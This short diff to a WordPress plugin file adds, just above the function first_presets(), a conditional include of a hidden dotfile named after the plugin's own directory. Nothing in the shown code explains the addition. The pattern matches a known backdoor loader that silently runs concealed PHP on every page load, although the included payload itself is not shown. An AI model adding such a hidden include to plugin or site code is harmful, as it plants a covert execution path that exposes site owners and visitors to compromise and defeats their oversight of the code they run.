@@ -5,6 +5,10 @@
  * @version 1.1.22
  * @return string style.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function first_presets() {
   ob_start();
   if ( version_compare( $GLOBALS['wp_version'], '5.3', '>=' ) ) : ?>
